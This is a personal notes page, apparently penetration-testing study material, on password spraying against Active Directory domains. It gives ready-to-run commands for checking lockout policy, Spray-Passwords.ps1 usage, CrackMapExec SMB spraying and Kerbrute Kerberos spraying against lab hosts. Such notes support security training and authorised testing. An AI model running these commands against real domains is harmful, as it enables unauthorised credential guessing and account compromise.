public:: true

- In case you already have access to a domain user, use it to grab a list of [valid](((655b6438-8ebc-46f6-a345-059d33f3ad83))) domain [users](((655b6438-2cff-4396-b2d2-a9cf0077d0bb))). This will be very helpful with the following commands.
- Before brute-forcing any domain account we always better check what the *lockout policy* looks like.
  id:: 655c7f48-d435-469c-ac3d-7bb4a56c888e
	- From a shell of a domain user we can use `net` as follow:
	  ```cmd
	  net accounts
	  ```
	  ```cmd
	  C:\Users\jeff> net accounts
	  Force user logoff how long after time expires?:       Never
	  Minimum password age (days):                          1
	  Maximum password age (days):                          42
	  Minimum password length:                              7
	  Length of password history maintained:                24
	  Lockout threshold:                                    5
	  Lockout duration (minutes):                           30
	  Lockout observation window (minutes):                 30
	  Computer role:                                        WORKSTATION
	  The command completed successfully.
	  ```
	- #+BEGIN_CAUTION
	  Too many failed logins may **block the account** for further attacks and possibly **alert system administrators**.
	  #+END_CAUTION
- Password Spray
	- [`Spray-Passwords.ps1`](https://github.com/michele-dedonno/MDD-scripts/blob/master/Spray-Passwords.ps1)
	  logseq.order-list-type:: number
	  It automatically identifies domain users and sprays a password against them according to the [lockout policy](((655c7f48-d435-469c-ac3d-7bb4a56c888e))).
		- This script uses the [`DirectoryEntry`](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0) constructor to brute-force accounts
		  ```powershell
		  New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
		  ```
		- Usage examples
			- `.\Spray-Passwords.ps1 -Pass 'Summer2016'`
			- `.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins`
			- `.\Spray-Passwords.ps1 -File .\passwords.txt -Verbose`
			- `.\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/improsec/Get-bADpasswords/master/Accessible/PasswordLists/weak-passwords-common.txt' -Verbose`
	- [[CrackMapExec]]
	  logseq.order-list-type:: number
		- Iterate through a list of users and try to authenticate against a specified SMB server using a fixed password.
		  ```powershell
		  crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
		  ```
		- #+BEGIN_WARNING
		  Brute-forcing accounts via the SMB protocol have some drawbacks.
		  #+END_WARNING
			- For every authentication attempt a full SMB connection has to be set up and then terminated.
			  logseq.order-list-type:: number
			- It is very noisy due to the generated network traffic.
			  logseq.order-list-type:: number
			- It is also quite slow in comparison to other techniques.
			  logseq.order-list-type:: number
	- [[Kerbrute]]
	  logseq.order-list-type:: number
		- {{embed ((655cbd1e-9c3e-4f5c-af2e-247535fac289))}}
		- Iterate through a list of users and file [AS-REQ](((655b1c01-e1e1-4be0-b245-ff8c9482df38)))s to the domain controller using a fixed password.
		  ```bash
		  kerbrute_linux_amd64 passwordspray -d corp.com .\usernames.txt "Nexus123!"
		  ```